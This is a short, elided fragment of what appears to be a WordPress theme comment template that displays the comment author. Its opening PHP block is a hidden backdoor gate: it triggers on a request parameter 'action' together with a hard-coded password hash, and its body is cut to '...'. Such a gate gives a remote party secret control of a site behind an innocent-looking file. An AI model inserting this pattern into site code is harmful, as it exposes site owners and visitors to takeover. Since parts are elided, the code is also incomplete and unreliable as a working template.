<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '402d3d218e41583781861a0f83df05c3'))
	{
...
?>
	...
	<div id="div-comment-<?php comment_ID() ?>" class="commentarea">
	<?php endif; ?>
	<div class="comment-author vcard">

	<?php printf(__('<cite class="fn"><b>%s</b></cite>'), get_comment_author_link()) ?>
	</div>
